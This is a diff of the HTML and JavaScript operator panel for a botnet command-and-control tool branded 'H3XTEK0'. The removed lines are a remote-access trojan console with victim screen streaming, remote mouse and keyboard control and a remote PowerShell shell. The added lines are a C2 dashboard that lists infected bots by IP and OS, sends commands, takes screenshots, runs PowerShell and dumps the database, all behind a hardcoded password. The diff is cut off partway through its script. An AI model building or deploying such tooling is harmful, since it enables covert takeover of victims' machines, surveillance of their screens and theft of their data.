@@ -3,714 +3,423 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>RAT Control - H3XTEK0</title>
+    <title>C2 Botnet - H3XTEK0</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: #0a0a0f; color: #fff; font-family: 'Segoe UI', sans-serif; overflow: hidden; height: 100vh; }
-        .container-rat { display: flex; height: 100vh; max-height: 100vh; overflow: hidden; background: #0a0a0f; }
-        
-        .sidebar { width: 280px; min-width: 220px; padding: 16px; border-right: 1px solid rgba(255, 0, 51, 0.25); display: flex; flex-direction: column; overflow-y: auto; flex-shrink: 0; background: rgba(20, 10, 15, 0.85); backdrop-filter: blur(12px); }
-        .sidebar h2 { font-size: 18px; font-weight: 700; color: #ff0033; margin-bottom: 4px; letter-spacing: 1px; }
-        .sidebar .sub-info { font-size: 11px; color: #884455; margin-bottom: 12px; }
-        .sidebar .sub-info span { color: #ff6677; }
-        .sidebar .refresh-btn { width: 100%; padding: 8px; background: rgba(255, 0, 51, 0.12); border: 1px solid rgba(255, 0, 51, 0.2); color: #ff6677; border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 12px; transition: all 0.3s; margin-bottom: 12px; }
-        .sidebar .refresh-btn:hover { background: rgba(255, 0, 51, 0.2); box-shadow: 0 0 20px rgba(255, 0, 51, 0.2); }
-        .bot-list { flex: 1; overflow-y: auto; margin: 4px 0 12px 0; }
-        .bot-item { padding: 10px 12px; margin: 4px 0; background: rgba(255,255,255,0.03); border-radius: 8px; cursor: pointer; border-left: 3px solid #ff4444; transition: all 0.25s ease; }
-        .bot-item.online { border-left-color: #ff0033; }
-        .bot-item:hover { background: rgba(255, 0, 51, 0.08); transform: translateX(4px); }
-        .bot-item.active { background: rgba(255, 0, 51, 0.15); border-left-color: #ff0033; box-shadow: 0 0 20px rgba(255, 0, 51, 0.1); }
-        .bot-item .name { font-weight: 600; font-size: 13px; }
-        .bot-item .ip { float: right; font-size: 11px; color: #884455; }
-        .bot-item .meta { font-size: 10px; color: #884455; margin-top: 2px; }
-        .quick-actions { border-top: 1px solid rgba(255, 0, 51, 0.1); padding-top: 12px; display: flex; flex-direction: column; gap: 6px; }
-        .quick-actions button { width: 100%; padding: 8px; background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.06); color: #ccc; border-radius: 8px; cursor: pointer; font-size: 12px; transition: all 0.3s; text-align: left; }
-        .quick-actions button:hover { background: rgba(255, 0, 51, 0.1); border-color: rgba(255, 0, 51, 0.2); color: #fff; }
-        
-        .main-rat { flex: 1; display: flex; flex-direction: column; min-width: 0; }
-        
-        .status-bar { padding: 6px 16px; background: rgba(20, 10, 15, 0.8); border-bottom: 1px solid rgba(255, 0, 51, 0.25); display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 4px 12px; font-size: 12px; color: #884455; flex-shrink: 0; }
-        .status-bar .bot-name { color: #ff6677; font-weight: 600; }
-        .status-bar .status-text { color: #00ff88; }
-        .status-bar .fps { color: #ff6677; }
-        .status-bar .coords { font-family: monospace; font-size: 11px; color: #884455; }
-        .status-bar .screen-size { font-size: 10px; color: #666; }
-        
-        .screen-area { flex: 1; display: flex; align-items: center; justify-content: center; background: #050505; position: relative; overflow: hidden; min-height: 200px; }
-        #screenCanvas { max-width: 100%; max-height: 100%; cursor: crosshair; background: #0a0a0f; image-rendering: auto; display: block; }
-        .placeholder-text { position: absolute; color: #444; font-size: 16px; text-align: center; pointer-events: none; user-select: none; opacity: 0.6; }
-        .placeholder-text span { display: block; font-size: 12px; color: #666; margin-top: 4px; }
-        
-        .shell-area { background: rgba(0,0,0,0.8); border-top: 1px solid rgba(255, 0, 51, 0.15); padding: 8px 12px; flex-shrink: 0; max-height: 200px; display: flex; flex-direction: column; }
-        .shell-output { flex: 1; overflow-y: auto; font-family: 'Courier New', monospace; font-size: 12px; color: #00ff88; padding: 4px 8px; min-height: 60px; max-height: 120px; background: rgba(0,0,0,0.3); border-radius: 4px; margin-bottom: 6px; white-space: pre-wrap; word-break: break-all; line-height: 1.4; }
-        .shell-output .prompt { color: #ff0033; }
-        .shell-output .error { color: #ff4444; }
-        .shell-output .ok { color: #00ff88; }
-        .shell-output .warn { color: #ffaa00; }
-        .shell-input-row { display: flex; gap: 6px; align-items: center; }
-        .shell-input-row .prompt-label { color: #ff0033; font-weight: 700; font-family: monospace; font-size: 13px; flex-shrink: 0; }
-        .shell-input-row input { flex: 1; background: rgba(255,255,255,0.05); border: 1px solid rgba(255, 0, 51, 0.2); border-radius: 6px; padding: 6px 12px; color: #00ff88; font-family: 'Courier New', monospace; font-size: 13px; outline: none; }
-        .shell-input-row input:focus { border-color: #ff0033; box-shadow: 0 0 15px rgba(255, 0, 51, 0.2); }
-        .shell-input-row input:disabled { opacity: 0.4; cursor: not-allowed; }
-        .shell-input-row button { padding: 6px 16px; background: #ff0033; color: #fff; border: none; border-radius: 6px; cursor: pointer; font-weight: 600; font-size: 12px; transition: all 0.3s; }
-        .shell-input-row button:hover { background: #cc0028; box-shadow: 0 0 20px rgba(255, 0, 51, 0.3); }
-        .shell-input-row button:disabled { opacity: 0.5; cursor: not-allowed; }
-        
-        .controls { padding: 8px 16px; background: rgba(20, 10, 15, 0.8); border-top: 1px solid rgba(255, 0, 51, 0.25); display: flex; flex-wrap: wrap; gap: 6px; align-items: center; flex-shrink: 0; }
-        .controls input { flex: 1; min-width: 80px; padding: 6px 12px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255, 0, 51, 0.15); border-radius: 6px; color: #fff; font-size: 12px; }
-        .controls input::placeholder { color: rgba(255,255,255,0.25); }
-        .controls input:focus { outline: none; border-color: #ff0033; box-shadow: 0 0 15px rgba(255, 0, 51, 0.2); }
-        .controls button { padding: 6px 14px; border: none; border-radius: 6px; cursor: pointer; font-weight: 600; font-size: 12px; transition: all 0.3s; white-space: nowrap; }
-        .controls .btn-ctrl { background: rgba(255,255,255,0.06); color: #ccc; border: 1px solid rgba(255,255,255,0.06); }
-        .controls .btn-ctrl:hover { background: rgba(255, 0, 51, 0.15); border-color: #ff0033; color: #fff; box-shadow: 0 0 15px rgba(255, 0, 51, 0.2); }
-        .controls .btn-ctrl.primary { background: #ff0033; color: #fff; border-color: #ff0033; }
-        .controls .btn-ctrl.primary:hover { background: #cc0028; box-shadow: 0 0 25px rgba(255, 0, 51, 0.4); }
-        .controls .btn-ctrl.danger { background: rgba(255, 0, 68, 0.2); color: #ff4444; border-color: rgba(255, 0, 68, 0.2); }
-        .controls .btn-ctrl.danger:hover { background: rgba(255, 0, 68, 0.3); box-shadow: 0 0 20px rgba(255, 0, 68, 0.2); }
-        
+        body { background: #0a0a0f; color: #fff; font-family: 'Segoe UI', sans-serif; padding: 20px; }
+        .container { max-width: 1440px; margin: 0 auto; }
+        .header { display: flex; justify-content: space-between; align-items: center; padding: 16px 24px; margin-bottom: 24px; flex-wrap: wrap; gap: 12px; background: rgba(20, 10, 15, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(255, 0, 51, 0.25); border-radius: 16px; }
+        .header h1 { font-size: 24px; font-weight: 800; background: linear-gradient(135deg, #ff0033, #ff6688); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .header h1 .sub { font-size: 12px; font-weight: 400; -webkit-text-fill-color: rgba(255,255,255,0.4); display: block; }
+        .password-badge { background: rgba(255, 0, 51, 0.2); border: 1px solid rgba(255, 0, 51, 0.3); padding: 6px 16px; border-radius: 20px; font-size: 12px; color: #ff6677; font-family: monospace; }
+        .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px; margin-bottom: 24px; }
+        .stat-card { padding: 20px; text-align: center; background: rgba(20, 10, 15, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(255, 0, 51, 0.25); border-radius: 16px; transition: all 0.3s; }
+        .stat-card:hover { transform: translateY(-4px); box-shadow: 0 0 40px rgba(255, 0, 51, 0.3); }
+        .stat-number { font-size: 32px; font-weight: 700; background: linear-gradient(135deg, #ff0033, #ff6688); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .stat-label { font-size: 13px; color: rgba(255,255,255,0.5); margin-top: 4px; text-transform: uppercase; letter-spacing: 1px; }
+        .action-bar { display: flex; gap: 12px; flex-wrap: wrap; margin-bottom: 20px; }
+        .btn { display: inline-flex; align-items: center; justify-content: center; gap: 8px; padding: 10px 24px; border: none; border-radius: 10px; font-weight: 600; font-size: 14px; cursor: pointer; transition: all 0.3s; text-decoration: none; text-transform: uppercase; letter-spacing: 0.5px; }
+        .btn-primary { background: linear-gradient(135deg, #ff0033, #cc0028); color: #fff; box-shadow: 0 0 25px rgba(255, 0, 51, 0.4); }
+        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 0 45px rgba(255, 0, 51, 0.5); }
+        .btn-outline { background: transparent; color: #ff0033; border: 1.5px solid #ff0033; }
+        .btn-outline:hover { background: rgba(255, 0, 51, 0.15); box-shadow: 0 0 25px rgba(255, 0, 51, 0.2); }
+        .btn-danger { background: linear-gradient(135deg, #cc0033, #880022); color: #fff; }
+        .btn-rat { background: linear-gradient(135deg, #ff0033, #cc0028); color: #fff; padding: 12px 30px; border-radius: 12px; font-weight: 700; font-size: 15px; box-shadow: 0 0 35px rgba(255, 0, 51, 0.35); text-decoration: none; display: inline-flex; align-items: center; gap: 10px; transition: all 0.3s; }
+        .btn-rat:hover { transform: translateY(-3px); box-shadow: 0 0 55px rgba(255, 0, 51, 0.5); }
+        .btn-small { padding: 4px 12px; font-size: 11px; border-radius: 6px; }
+        .input-glass { background: rgba(255,255,255,0.05); border: 1.5px solid rgba(255, 0, 51, 0.2); border-radius: 10px; padding: 12px 16px; color: #fff; font-size: 14px; transition: all 0.3s; width: 100%; }
+        .input-glass::placeholder { color: rgba(255,255,255,0.35); }
+        .input-glass:focus { outline: none; border-color: #ff0033; box-shadow: 0 0 25px rgba(255, 0, 51, 0.3); }
+        .cmd-box { display: flex; gap: 10px; flex-wrap: wrap; padding: 16px 20px; margin-bottom: 20px; align-items: center; background: rgba(20, 10, 15, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(255, 0, 51, 0.25); border-radius: 16px; }
+        .cmd-box input { flex: 1; min-width: 100px; }
+        .cmd-box input:first-child { flex: 0.6; min-width: 80px; }
+        .cmd-box input:nth-child(2) { flex: 2; }
+        .cmd-box .result-box { background: rgba(0,0,0,0.5); padding: 10px 16px; border-radius: 10px; border: 1px solid rgba(255, 0, 51, 0.15); font-family: monospace; font-size: 13px; min-width: 150px; max-width: 350px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; color: #ff6677; }
+        .cmd-box .result-box .ok { color: #00ff88; }
+        .cmd-box .result-box .pending { color: #ffaa00; }
+        .cmd-box .result-box .error { color: #ff0044; }
+        .table-wrap { background: rgba(20, 10, 15, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(255, 0, 51, 0.25); border-radius: 16px; overflow-x: auto; padding: 4px 0; }
+        table { width: 100%; border-collapse: collapse; font-size: 13px; }
+        table thead { background: rgba(255, 0, 51, 0.08); }
+        table th { padding: 12px 14px; text-align: left; font-weight: 600; color: #ff6677; text-transform: uppercase; font-size: 11px; letter-spacing: 0.5px; border-bottom: 2px solid rgba(255, 0, 51, 0.15); }
+        table td { padding: 10px 14px; border-bottom: 1px solid rgba(255,255,255,0.04); vertical-align: middle; }
+        table tr:hover td { background: rgba(255, 0, 51, 0.04); }
+        .online { color: #00ff88; }
+        .offline { color: #ff4444; }
         .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px); z-index: 1000; align-items: center; justify-content: center; padding: 20px; }
         .modal.active { display: flex; }
-        .modal-content { max-width: 500px; width: 100%; padding: 28px; overflow-y: auto; position: relative; background: rgba(20, 10, 15, 0.9); backdrop-filter: blur(12px); border: 1px solid rgba(255, 0, 51, 0.25); border-radius: 16px; box-shadow: 0 0 60px rgba(255, 0, 51, 0.15); }
+        .modal-content { max-width: 700px; width: 100%; max-height: 85vh; padding: 28px; overflow-y: auto; position: relative; background: rgba(20, 10, 15, 0.9); backdrop-filter: blur(12px); border: 1px solid rgba(255, 0, 51, 0.25); border-radius: 16px; box-shadow: 0 0 60px rgba(255, 0, 51, 0.15); }
         .modal-content .close { position: absolute; top: 12px; right: 18px; font-size: 28px; cursor: pointer; color: #884455; transition: color 0.3s; line-height: 1; }
         .modal-content .close:hover { color: #ff0033; }
         .modal-content h3 { color: #ff0033; margin-bottom: 16px; font-size: 18px; }
-        .modal-content textarea, .modal-content input { width: 100%; padding: 10px; background: rgba(0,0,0,0.5); border: 1px solid rgba(255, 0, 51, 0.15); border-radius: 8px; color: #fff; font-size: 13px; margin-bottom: 10px; }
-        .modal-content textarea:focus, .modal-content input:focus { outline: none; border-color: #ff0033; }
-        .modal-content .btn { width: 100%; padding: 10px; margin-top: 6px; background: #ff0033; color: #fff; border: none; border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 14px; transition: all 0.3s; }
-        .modal-content .btn:hover { background: #cc0028; box-shadow: 0 0 25px rgba(255, 0, 51, 0.4); }
-        
+        .modal-content pre { background: rgba(0,0,0,0.6); padding: 16px; border-radius: 8px; font-size: 13px; line-height: 1.6; overflow-x: auto; color: #ccdddd; max-height: 50vh; overflow-y: auto; border: 1px solid rgba(255, 0, 51, 0.1); font-family: 'Courier New', monospace; white-space: pre-wrap; word-break: break-word; }
+        .modal-content .screenshot-img { width: 100%; border-radius: 8px; border: 1px solid rgba(255, 0, 51, 0.15); max-height: 60vh; object-fit: contain; background: #0a0a0f; }
+        .modal-content .screenshot-actions { display: flex; gap: 10px; margin-top: 12px; flex-wrap: wrap; }
+        .modal-content .screenshot-actions button { padding: 8px 20px; border: none; border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 13px; transition: all 0.3s; }
+        .btn-close-modal { background: rgba(255,255,255,0.1); color: #fff; }
+        .btn-close-modal:hover { background: rgba(255,255,255,0.2); }
+        .btn-download { background: #00ff88; color: #0a0a0f; }
+        .btn-download:hover { background: #00dd77; }
+        .ps-input-group { display: flex; gap: 10px; margin-top: 10px; flex-wrap: wrap; }
+        .ps-input-group input { flex: 1; min-width: 150px; }
+        .ps-input-group button { padding: 10px 24px; }
         @media (max-width: 768px) {
-            .sidebar { width: 100%; min-width: unset; max-height: 160px; border-right: none; border-bottom: 1px solid rgba(255, 0, 51, 0.25); padding: 10px; flex-shrink: 0; overflow-y: auto; }
-            .sidebar h2 { font-size: 14px; }
-            .bot-list { display: flex; gap: 6px; overflow-x: auto; padding: 4px 0; flex-wrap: nowrap; }
-            .bot-item { flex: 0 0 auto; min-width: 100px; padding: 6px 10px; margin: 0; }
-            .bot-item .ip { float: none; display: block; }
-            .quick-actions { flex-direction: row; flex-wrap: wrap; border-top: none; padding-top: 4px; gap: 4px; }
-            .quick-actions button { flex: 1; min-width: 60px; padding: 4px 8px; font-size: 10px; text-align: center; }
-            .container-rat { flex-direction: column; height: 100vh; overflow: hidden; }
-            .controls { padding: 6px 10px; gap: 4px; flex-wrap: wrap; }
-            .controls input { font-size: 11px; padding: 4px 8px; min-width: 50px; }
-            .controls button { font-size: 10px; padding: 4px 10px; }
-            .status-bar { font-size: 10px; padding: 4px 10px; }
-            .screen-area { min-height: 120px; }
-            .shell-area { max-height: 140px; }
-            .shell-output { font-size: 11px; min-height: 40px; max-height: 80px; }
-            .shell-input-row input { font-size: 11px; padding: 4px 8px; }
-            .shell-input-row button { font-size: 10px; padding: 4px 12px; }
+            .container { padding: 12px; }
+            .header h1 { font-size: 18px; }
+            .stats { grid-template-columns: repeat(2, 1fr); gap: 10px; }
+            .stat-card { padding: 14px; }
+            .stat-number { font-size: 22px; }
+            .cmd-box { flex-direction: column; }
+            .cmd-box input { width: 100% !important; flex: none !important; }
+            .cmd-box .result-box { max-width: 100%; font-size: 12px; }
+            table { font-size: 11px; }
+            table th, table td { padding: 6px 8px; }
             .modal-content { margin: 10px; padding: 16px; max-width: 95%; }
+            .modal-content .screenshot-img { max-height: 40vh; }
+            .btn { padding: 8px 16px; font-size: 12px; }
+            .btn-rat { padding: 10px 20px; font-size: 13px; }
         }
         @media (max-width: 480px) {
-            .sidebar { max-height: 130px; padding: 6px; }
-            .bot-item { min-width: 70px; padding: 4px 6px; font-size: 10px; }
-            .controls input { font-size: 10px; padding: 3px 6px; min-width: 40px; }
-            .controls button { font-size: 9px; padding: 3px 8px; }
-            .status-bar { font-size: 9px; padding: 2px 8px; }
-            .shell-area { max-height: 120px; }
-            .shell-output { font-size: 10px; min-height: 30px; max-height: 60px; }
+            .stats { grid-template-columns: 1fr 1fr; gap: 6px; }
+            .stat-number { font-size: 18px; }
+            .stat-label { font-size: 10px; }
+            table { font-size: 9px; }
+            table th, table td { padding: 4px 6px; }
+            .modal-content { padding: 12px; }
+            .modal-content h3 { font-size: 15px; }
+            .btn { font-size: 10px; padding: 6px 12px; }
         }
     </style>
 </head>
 <body>
-    <div class="container-rat">
-        <!-- SIDEBAR -->
-        <div class="sidebar">
-            <h2>🎯 RAT</h2>
-            <div class="sub-info">🔑 H3XTEK0 · <span id="botCount">0</span> bots online</div>
-            <button class="refresh-btn" onclick="refreshBots()">🔄 Refresh</button>
-            <div class="bot-list" id="botList"><div style="color:#444;text-align:center;padding:16px;font-size:13px;">Đang tải bot...</div></div>
-            <div class="quick-actions">
-                <button onclick="openNotepadModal()">📝 Notepad</button>
-                <button onclick="openBrowserModal()">🌐 Browser</button>
-                <button onclick="openMessageBoxModal()">💬 MessageBox</button>
-            </div>
+    <div class="container">
+        <div class="header">
+            <h1>⚡ H3XTEK0<span class="sub">C2 Botnet Control</span></h1>
+            <div class="password-badge">🔑 H3XTEK0</div>
         </div>
 
-        <!-- MAIN -->
-        <div class="main-rat">
-            <div class="status-bar">
-                <span class="bot-name" id="currentBot">🔴 Chưa chọn bot</span>
-                <span class="status-text" id="statusText">Idle</span>
-                <span class="fps" id="fpsText">0 FPS</span>
-                <span class="coords" id="debugCoords">(0, 0)</span>
-                <span class="screen-size" id="screenSize">1920x1080</span>
-            </div>
+        <div class="stats">
+            <div class="stat-card"><div class="stat-number" id="totalBots">0</div><div class="stat-label">Tổng Bot</div></div>
+            <div class="stat-card"><div class="stat-number" id="onlineBots">0</div><div class="stat-label">Online</div></div>
+            <div class="stat-card"><div class="stat-number" id="offlineBots">0</div><div class="stat-label">Offline</div></div>
+            <div class="stat-card"><div class="stat-number" id="groupsCount">0</div><div class="stat-label">Groups</div></div>
+        </div>
 
-            <div class="screen-area" id="screenArea">
-                <canvas id="screenCanvas"></canvas>
-                <div class="placeholder-text" id="placeholderText">🔴 Chọn bot để bắt đầu RAT<span>Click vào ảnh để điều khiển chuột</span></div>
-            </div>
+        <div class="action-bar">
+            <a href="/rat" class="btn-rat">🎯 RAT Control</a>
+            <button onclick="viewDB()" class="btn btn-outline">📊 Database</button>
+            <button onclick="clearAllData()" class="btn btn-danger">🗑️ Xóa DB</button>
+        </div>
 
-            <!-- SHELL TERMINAL -->
-            <div class="shell-area">
-                <div class="shell-output" id="shellOutput">
-                    <span class="prompt">[H3XTEK0] </span>Chọn bot để bắt đầu shell<br>
-                </div>
-                <div class="shell-input-row">
-                    <span class="prompt-label">$</span>
-                    <input type="text" id="shellInput" placeholder="Nhập lệnh PowerShell..." disabled>
-                    <button id="shellSendBtn" onclick="sendShellCommand()" disabled>⏎</button>
-                </div>
-            </div>
+        <div class="cmd-box">
+            <input type="text" id="botIdInput" class="input-glass" placeholder="Bot ID">
+            <input type="text" id="cmdInput" class="input-glass" placeholder="Lệnh (ps, sc, ping...)" style="flex:2;">
+            <input type="text" id="argsInput" class="input-glass" placeholder='Args ["arg1"]'>
+            <button onclick="sendCommand()" class="btn btn-primary">🚀 Gửi</button>
+            <div class="result-box" id="cmdResultDisplay">⏳ Chưa có kết quả</div>
+        </div>
 
-            <!-- CONTROLS -->
-            <div class="controls">
-                <input type="text" id="urlInput" placeholder="URL..." style="flex:1;min-width:80px;">
-                <button class="btn-ctrl primary" onclick="openBrowser()">🌐 Mở</button>
-                <input type="text" id="textInput" placeholder="Text..." style="flex:1;min-width:60px;">
-                <button class="btn-ctrl" onclick="sendKeyboard()">⌨️ Gõ</button>
-                <button class="btn-ctrl" onclick="sendClick('left')">🖱️ Click</button>
-                <button class="btn-ctrl" onclick="sendClick('right')">🖱️ Right</button>
-                <button class="btn-ctrl" onclick="sendClick('double')">🖱️ Double</button>
-                <button class="btn-ctrl danger" onclick="stopRAT()">⏹️ Dừng</button>
-            </div>
+        <div class="table-wrap">
+            <table>
+                <thead><tr><th>Bot ID</th><th>Group</th><th>Version</th><th>OS</th><th>IP</th><th>Last Seen</th><th>Status</th><th>Actions</th></tr></thead>
+                <tbody id="botsTable"></tbody>
+            </table>
         </div>
     </div>
 
     <!-- MODALS -->
-    <div id="notepadModal" class="modal">
-        <div class="modal-content">
-            <span class="close" onclick="closeModal('notepadModal')">&times;</span>
-            <h3>📝 Notepad Remote</h3>
-            <textarea id="notepadText" placeholder="Nhập text để ghi vào notepad..." rows="4"></textarea>
-            <button onclick="sendNotepad()" class="btn">📝 Ghi vào Notepad</button>
-        </div>
-    </div>
-
-    <div id="browserModal" class="modal">
-        <div class="modal-content">
-            <span class="close" onclick="closeModal('browserModal')">&times;</span>
-            <h3>🌐 Mở Browser</h3>
-            <input type="text" id="browserUrlInput" placeholder="Nhập URL..." value="https://www.google.com">
-            <button onclick="openBrowserFromModal()" class="btn">🌐 Mở URL</button>
-        </div>
-    </div>
-
-    <div id="messageBoxModal" class="modal">
-        <div class="modal-content">
-            <span class="close" onclick="closeModal('messageBoxModal')">&times;</span>
-            <h3>💬 MessageBox</h3>
-            <input type="text" id="msgTitle" placeholder="Tiêu đề..." value="Thông báo">
-            <textarea id="msgContent" placeholder="Nội dung thông báo..." rows="3">Đây là thông báo từ H3XTEK0</textarea>
-            <input type="text" id="msgButton" placeholder="Nút (OK/Cancel/Yes/No)" value="OK">
-            <button onclick="sendMessageBox()" class="btn">💬 Gửi MessageBox</button>
-        </div>
-    </div>
+    <div id="dbModal" class="modal"><div class="modal-content"><span class="close" onclick="closeModal('dbModal')">&times;</span><h3>📊 Toàn bộ Database</h3><pre id="dbContent">Đang tải...</pre></div></div>
+    <div id="resultModal" class="modal"><div class="modal-content"><span class="close" onclick="closeModal('resultModal')">&times;</span><h3 id="resultModalTitle">📋 Kết quả lệnh</h3><pre id="resultContent">Đang tải...</pre></div></div>
+    <div id="screenshotModal" class="modal"><div class="modal-content"><span class="close" onclick="closeModal('screenshotModal')">&times;</span><h3>🖼️ Screenshot</h3><img id="screenshotImage" class="screenshot-img" src="" alt="Screenshot"><div class="screenshot-actions"><button class="btn-close-modal" onclick="closeModal('screenshotModal')">Đóng</button><button class="btn-download" onclick="downloadScreenshot()">⬇️ Tải</button><button class="btn btn-primary" onclick="refreshScreenshot()">🔄 Chụp lại</button></div></div></div>
+    <div id="psModal" class="modal"><div class="modal-content"><span class="close" onclick="closeModal('psModal')">&times;</span><h3>💻 PowerShell</h3><p style="color:#888;font-size:13px;margin-bottom:12px;">Nhập lệnh PowerShell</p><input type="text" id="psCommandInput" class="input-glass" placeholder="Ví dụ: Get-Process" style="width:100%;"><div class="ps-input-group"><input type="text" id="psBotIdInput" class="input-glass" placeholder="Bot ID" style="flex:0.6;"><button onclick="sendPsCommand()" class="btn btn-primary" style="flex:1;">⚡ Thực thi</button></div></div></div>
 
     <script>
-        // ============================================================
-        //  RAT CONTROL - FULL SCRIPT
-        // ============================================================
-
-        let currentBotId = null;
-        let isStreaming = false;
-        let streamInterval = null;
-        let fps = 0;
-        let frameCount = 0;
-        let botScreenWidth = 1920;
-        let botScreenHeight = 1080;
-        let lastMoveTime = 0;
-        let isShellWaiting = false;
-        let lastShellCmdId = null;
-
-        const canvas = document.getElementById('screenCanvas');
-        const ctx = canvas.getContext('2d');
         const API_PASSWORD = 'H3XTEK0';
-        const shellOutput = document.getElementById('shellOutput');
-        const shellInput = document.getElementById('shellInput');
-        const shellSendBtn = document.getElementById('shellSendBtn');
+        let botsData = [];
+        let pollingInterval = null;
+        let lastScreenshotData = null;
 
         function getAuth() { return { 'Authorization': `Bearer ${API_PASSWORD}` }; }
-        
-        function closeModal(id) { 
-            const el = document.getElementById(id);
-            if (el) {
-                el.classList.remove('active');
-                el.style.display = 'none';
-            }
-        }
-        
-        function openModal(id) { 
-            const el = document.getElementById(id);
-            if (el) {
-                el.style.display = 'flex';
-                setTimeout(() => el.classList.add('active'), 10);
-            }
-        }
+        function closeModal(id) { document.getElementById(id).classList.remove('active'); document.getElementById(id).style.display = 'none'; }
+        function openModal(id) { const el = document.getElementById(id); el.style.display = 'flex'; setTimeout(() => el.classList.add('active'), 10); }
 
-        function getCanvasCoords(e) {
-            const rect = canvas.getBoundingClientRect();
-            let canvasX = (e.clientX - rect.left);
-            let canvasY = (e.clientY - rect.top);
-            canvasX = Math.max(0, Math.min(rect.width, canvasX));
-            canvasY = Math.max(0, Math.min(rect.height, canvasY));
-            
-            const scaleX = canvas.width / rect.width;
-            const scaleY = canvas.height / rect.height;
-            
-            let x = canvasX * scaleX;
-            let y = canvasY * scaleY;
-            x = Math.max(0, Math.min(canvas.width, x));
-            y = Math.max(0, Math.min(canvas.height, y));
-            
-            const botX = Math.round((x / canvas.width) * botScreenWidth);
-            const botY = Math.round((y / canvas.height) * botScreenHeight);
-            
-            return { x: botX, y: botY };
-        }
-
-        function shellLog(text, type = 'info') {
-            const time = new Date().toLocaleTimeString();
-            const icon = type === 'error' ? '❌' : type === 'ok' ? '✅' : type === 'warn' ? '⚠️' : type === 'prompt' ? '$' : 'ℹ️';
-            const color = type === 'error' ? 'error' : type === 'ok' ? 'ok' : type === 'warn' ? 'warn' : '';
-            shellOutput.innerHTML += `<span class="${color}">[${time}] ${icon} ${text}</span>\n`;
-            shellOutput.scrollTop = shellOutput.scrollHeight;
-        }
-
-        // --- BOT LIST ---
-        async function refreshBots() {
+        async function fetchBots() {
             try {
-                const res = await fetch('/api/bots/online', { headers: getAuth() });
-                const bots = await res.json();
-                document.getElementById('botCount').textContent = bots.length;
-                renderBotList(bots);
-            } catch (e) { console.error('Lỗi refresh bot:', e); }
+                const res = await fetch('/api/bots', { headers: getAuth() });
+                const data = await res.json();
+                botsData = data;
+                renderBots(data);
+                updateStats(data);
+            } catch (e) { console.error('Lỗi fetch bots:', e); }
         }
 
-        function renderBotList(bots) {
-            const list = document.getElementById('botList');
-            list.innerHTML = '';
-            if (bots.length === 0) {
-                list.innerHTML = '<div style="color:#444;text-align:center;padding:16px;">🔴 Không có bot online</div>';
+        function renderBots(data) {
+            const tbody = document.getElementById('botsTable');
+            tbody.innerHTML = '';
+            if (!data || data.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="8" style="text-align:center;padding:30px;color:#444;">🔴 Chưa có bot nào kết nối</td></tr>`;
                 return;
             }
-            bots.forEach(b => {
-                const div = document.createElement('div');
-                div.className = 'bot-item online';
-                if (b.bot_id === currentBotId) div.classList.add('active');
-                div.innerHTML = `<span class="name">${b.bot_id.slice(0, 8)}...</span><span class="ip">${b.ip || 'N/A'}</span><div class="meta">${b.os || 'Unknown'} · v${b.version || '1.0'}</div>`;
-                div.onclick = () => selectBot(b.bot_id);
-                list.appendChild(div);
+            data.forEach(b => {
+                const tr = document.createElement('tr');
+                tr.innerHTML = `
+                    <td><strong>${b.bot_id.slice(0, 8)}...</strong></td>
+                    <td>${b.group_name || 'default'}</td>
+                    <td>v${b.version || '1.0'}</td>
+                    <td>${b.os || 'Unknown'}</td>
+                    <td>${b.ip || 'N/A'}</td>
+                    <td>${b.last_seen ? new Date(b.last_seen).toLocaleString() : 'N/A'}</td>
+                    <td class="${b.online ? 'online' : 'offline'}">${b.online ? '🟢 Online' : '🔴 Offline'}</td>
+                    <td style="display:flex;gap:4px;flex-wrap:wrap;">
+                        <button class="btn btn-primary btn-small" onclick="selectBot('${b.bot_id}')">Chọn</button>
+                        <button class="btn btn-outline btn-small" onclick="openPsModal('${b.bot_id}')">💻 PS</button>
+                        <button class="btn btn-outline btn-small" onclick="takeScreenshot('${b.bot_id}')">📸</button>
+                        <button class="btn btn-danger btn-small" onclick="deleteBot('${b.bot_id}')">🗑️</button>
+                    </td>
+                `;
+                tbody.appendChild(tr);
             });
         }
 
-        // --- SELECT BOT ---
-        async function selectBot(botId) {
-            if (currentBotId === botId) return;
-            
-            try {
-                const res = await fetch('/api/bots', { headers: getAuth() });
-                const bots = await res.json();
-                const bot = bots.find(b => b.bot_id === botId);
-                if (bot) {
-                    botScreenWidth = bot.screen_width || 1920;
-                    botScreenHeight = bot.screen_height || 1080;
-                    document.getElementById('screenSize').textContent = `${botScreenWidth}x${botScreenHeight}`;
-                }
-            } catch(e) {}
-            
-            if (isStreaming) stopStream();
-            
-            currentBotId = botId;
-            document.getElementById('currentBot').textContent = `🎯 ${botId.slice(0, 8)}...`;
-            document.getElementById('placeholderText').style.display = 'block';
-            document.getElementById('statusText').textContent = 'Connecting...';
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            
-            shellInput.disabled = false;
-            shellSendBtn.disabled = false;
-            shellLog(`Connected to bot ${botId.slice(0,8)}...`, 'ok');
-            shellLog('Shell ready. Type PowerShell commands.', 'prompt');
-            shellInput.focus();
-            
-            try {
-                const res = await fetch('/api/rat/start', {
-                    method: 'POST',
-                    headers: { ...getAuth(), 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ bot_id: botId })
-                });
-                const data = await res.json();
-                if (data.status === 'rat_started') {
-                    document.getElementById('statusText').textContent = 'Connected';
